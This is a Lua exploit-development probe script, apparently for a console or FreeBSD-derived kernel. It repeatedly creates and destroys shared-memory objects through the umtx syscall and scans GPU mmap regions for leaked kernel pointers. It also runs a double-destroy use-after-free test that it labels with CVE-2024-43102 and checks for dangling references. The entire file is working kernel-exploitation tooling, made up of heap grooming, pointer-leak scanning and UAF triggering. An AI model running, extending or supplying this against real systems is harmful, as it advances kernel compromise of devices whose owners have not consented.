-- CRASH_CLASS: MODERATE
-- PROBE 152b: SHM heap reclaim — safe version with fewer cycles
--
-- Context: 152a crashed at 0 bytes (no output). Likely too many SHM
-- create/destroy cycles or GPU mmap scan hit bad memory.
-- This version: 20 cycles (not 200), smaller GPU mmap (4 pages),
-- print after every major step for crash localization.

print("=== PROBE 152b: SHM HEAP RECLAIM (SAFE) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

collectgarbage("stop")
local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local sc_umtx = make_syscall(454)
local sc_mmap = make_syscall(477)

-- Single reusable key buffer
local key = memory.alloc(0x20)
memory.write_qword(key, uint64(0))
print("key_buf=" .. string.format("0x%X", to_num(key)))

-- ============================================================
-- SECTION A: GPU MMAP BASELINE (4 pages = 64KB)
-- ============================================================
print("")
print("--- SECTION A: GPU MMAP BASELINE ---")
local ok_g1, gpu1 = pcall(function()
    return sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not ok_g1 then
    print("gpu1 FAILED: " .. tostring(gpu1))
    print("canary=" .. to_num(syscall.getpid()))
    return
end
local g1h, g1l = get_hi_lo(gpu1)
print(string.format("gpu1=0x%X%08X", g1h, g1l))

-- Quick baseline scan
local kptr_base = 0
local nz_base = 0
for off = 0, 4 * 0x4000 - 8, 8 do
    local val = safe_rq(gpu1 + off)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh ~= 0 or vl ~= 0 then nz_base = nz_base + 1 end
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_base = kptr_base + 1
        end
    end
end
print("baseline: nonzero=" .. nz_base .. " kptr=" .. kptr_base)

-- ============================================================
-- SECTION B: SHM CREATE/DESTROY CHURN (20 cycles)
-- ============================================================
print("")
print("--- SECTION B: SHM CHURN (20 CYCLES) ---")

local create_ok = 0
local destroy_ok = 0

for i = 1, 20 do
    memory.write_qword(key, uint64(0xBB000000 + i))

    local ok1, r1 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    if ok1 and to_num(r1) == 0 then create_ok = create_ok + 1 end

    local ok2, r2 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    if ok2 and to_num(r2) == 0 then destroy_ok = destroy_ok + 1 end
end
print(string.format("create_ok=%d destroy_ok=%d", create_ok, destroy_ok))
print("checkpoint B canary=" .. to_num(syscall.getpid()))

-- ============================================================
-- SECTION C: GPU MMAP #2 AFTER CHURN
-- ============================================================
print("")
print("--- SECTION C: GPU MMAP #2 (RECLAIM) ---")
local ok_g2, gpu2 = pcall(function()
    return sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not ok_g2 then
    print("gpu2 FAILED: " .. tostring(gpu2))
    print("canary=" .. to_num(syscall.getpid()))
    return
end
local g2h, g2l = get_hi_lo(gpu2)
print(string.format("gpu2=0x%X%08X", g2h, g2l))

-- Scan for kernel pointers
local kptr_after = 0
local nz_after = 0
local ksamples = {}
for off = 0, 4 * 0x4000 - 8, 8 do
    local val = safe_rq(gpu2 + off)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh ~= 0 or vl ~= 0 then nz_after = nz_after + 1 end
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_after = kptr_after + 1
            if #ksamples < 5 then
                ksamples[#ksamples + 1] = string.format("+0x%X: 0x%08X%08X", off, vh, vl)
            end
        end
    end
end
print("reclaim: nonzero=" .. nz_after .. " kptr=" .. kptr_after)
for _, s in ipairs(ksamples) do print(s) end

-- ============================================================
-- SECTION D: DOUBLE DESTROY (CVE-2024-43102 pattern)
-- ============================================================
print("")
print("--- SECTION D: DOUBLE DESTROY ---")

for i = 1, 5 do
    memory.write_qword(key, uint64(0xDD000000 + i))

    -- Create
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)

    -- First destroy
    local ok1, r1 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    local rv1 = ok1 and to_num(r1) or -999

    -- Second destroy (hits freed memory if race works)
    local ok2, r2 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    local rv2 = ok2 and to_num(r2) or -999

    -- Alive check after double destroy
    local ok3, r3 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
    end)
    local rv3 = ok3 and to_num(r3) or -999

    print(string.format("dd[%d]: d1=%d d2=%d alive=%d", i, rv1, rv2, rv3))
end

-- ============================================================
-- SECTION E: DANGLING REFERENCE CHECK
-- ============================================================
print("")
print("--- SECTION E: DANGLING REFS ---")

local dangling = 0
for i = 1, 10 do
    memory.write_qword(key, uint64(0xCC000000 + i))
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    local ok, ret = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    if rv == 0 then
        dangling = dangling + 1
        print(string.format("DANGLING key=0xCC%06X alive_after_destroy=0!", i))
    end
end
print("dangling_count=" .. dangling)

-- ============================================================
-- SECTION F: SHM + GPU INTERLEAVE
-- ============================================================
print("")
print("--- SECTION F: SHM+GPU INTERLEAVE ---")

-- Interleave: create SHM, mmap GPU, destroy SHM, scan GPU
-- This maximizes chance of kernel slab landing in GPU mmap
memory.write_qword(key, uint64(0xFF000001))
pcall(function()
    sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
end)

local ok_g3, gpu3 = pcall(function()
    return sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

pcall(function()
    sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)

if ok_g3 then
    local g3h, g3l = get_hi_lo(gpu3)
    print(string.format("gpu3=0x%X%08X", g3h, g3l))

    local kptr3 = 0
    for off = 0, 4 * 0x4000 - 8, 8 do
        local val = safe_rq(gpu3 + off)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
                kptr3 = kptr3 + 1
                if kptr3 <= 3 then
                    print(string.format("GPU3 +0x%X: 0x%08X%08X", off, vh, vl))
                end
            end
        end
    end
    print("gpu3_kptr=" .. kptr3)
else
    print("gpu3 failed")
end

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 152b COMPLETE ===")
